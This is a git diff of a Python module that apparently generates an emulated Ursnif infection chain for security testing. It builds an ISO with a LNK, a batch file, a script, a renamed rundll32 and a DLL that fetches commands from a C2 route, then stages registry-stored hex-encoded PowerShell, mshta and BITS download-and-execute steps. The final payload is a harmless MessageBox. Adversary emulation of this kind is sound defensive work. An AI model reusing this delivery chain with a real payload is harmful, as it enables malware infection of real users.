@@ -17,25 +17,26 @@ from model import *
 
 def ursnif(baseUrl) -> List[AceRoute]:
     routes = []
-    # ISO -> lnk -> bat1 -> wscript -> rundll32 -> download:cmd -> MSHTA -> reg -> activex -> powershell -> payload:process-injection
+    # ISO -> lnk -> bat -> wscript -> rundll32 -> download:cmd -> MSHTA -> reg:activex -> reg:powershell
+    #   -> download:cmd -> download-bits:ps -> ps -> MessageBox
 
-    # Stage 8:
+    # Phase 3
+    # Stage 8: Final PS
     psScript: AceStr = makePsScriptMessagebox()
-    serveHtml: AceRoute = makeAceRoute('/ursnif/a', psScript, info='Payload: psScript MessageBox')
+    serveHtml: AceRoute = makeAceRoute('/ursnif/a', psScript, info='Final Payload')
     routes.append(serveHtml)
 
-    # Stage 7: cobaltstrike download & execute with powershell & bits
+    # Stage 7: cmdline: Download & Exec PS with BITS
     cmdline = renderTemplate('recipes/ursnif/bitsexec.cmd', baseUrl=baseUrl)
-    serveHtml: AceRoute = makeAceRoute('/ursnif/c2-2', cmdline, info='bitsexec.cmd: Start bits transfer and exec of psScript')
+    serveHtml: AceRoute = makeAceRoute('/ursnif/c2-2', cmdline, info='Phase 3')
     routes.append(serveHtml)
 
-    # Stage 6.5: payload2
-    #payload2 = makeExeCmdC2(baseUrl + '/ursnif/c2-2')
-    #serveHtml: AceRoute = makeAceRoute('/ursnif/c2-2', cmdline, info='bitsexec.cmd: Start bits transfer and exec of psScript')
-    #routes.append(serveHtml)
 
-    # Stage 6: MemoryJunk: Would do process injection. starts payload2 instead
-    memoryJunk: AceStr = makePsScriptMessagebox()
+    # Phase 2: A bat downloaded by itsIt.db
+    # Will add reg1, reg2. Start mshta -> reg1 -> reg2 -> psScript:download&exec /ursnif/c2-2
+
+    # Stage 6: MemoryJunk (psScript): Would do process injection. download & exec payload2 instead
+    memoryJunk: AceStr = makePsScriptToCmdByDownloadCmd(baseUrl + '/ursnif/c2-2')
     memoryJunk = makePsCommandFromPsScript(memoryJunk)
     memoryJunk = bytes(memoryJunk, 'utf-8')
     memoryJunk = hexlify(memoryJunk).decode('utf-8')
@@ -63,17 +64,21 @@ def ursnif(baseUrl) -> List[AceRoute]:
         activeDeviceJsRegAdd,
         mshtaCmd,
     ])
-    serveHtml: AceRoute = makeAceRoute('/ursnif/c2', bat, info='Add reg x2 and mshta to start')
+    serveHtml: AceRoute = makeAceRoute('/ursnif/c2', bat, info='Phase 2')
     routes.append(serveHtml)
 
-    # Stage 3: DLL itsIt.db -> C2 -> execute BAT
+
+    # Phase 1: the following are all in the ISO
+    # itsIt.db DLL will download & exec from: /ursnif/c2
+
+    # Stage 3: DLL itsIt.db -> execute BAT <- C2
     parsed_url = urllib.parse.urlparse(baseUrl)
     host = parsed_url.hostname
     port = parsed_url.port
     itsItdb = makePeExecCmdC2(host, port, '/ursnif/c2', asDll=True)
     itsItdbFile: AceFile = makeAceFile('itsIt.db', itsItdb)
 
-    # Stage 2: Wscript -> 123.com/rundll32.exe -> itsIt.db
+    # Stage 2: canWell.js -> 123.com/rundll32.exe -> itsIt.db
     canWellJs: AceBytes = readFileContent('recipes/ursnif/canWell.js')
     canWellJsFile: AceFile = makeAceFile('canWell.js', canWellJs)
 
@@ -96,7 +101,7 @@ def ursnif(baseUrl) -> List[AceRoute]:
     )
     lnkFile: AceFile = makeAceFile('6570872.lnk', lnkData)
 
-    # Pack DLL and LNK into ISO
+    # Create ISO as Entry
     iso: AceBytes = makeIso(files = [
         alsoOneBatFile,
         canWellJsFile,
@@ -104,7 +109,6 @@ def ursnif(baseUrl) -> List[AceRoute]:
         com123File,
         lnkFile,
     ])
-    #isoFile: AceFile = makeAceFile('3488164.iso', iso)
     serveHtml: AceRoute = makeAceRoute(
         '/ursnif/3488164.iso', 
         iso,
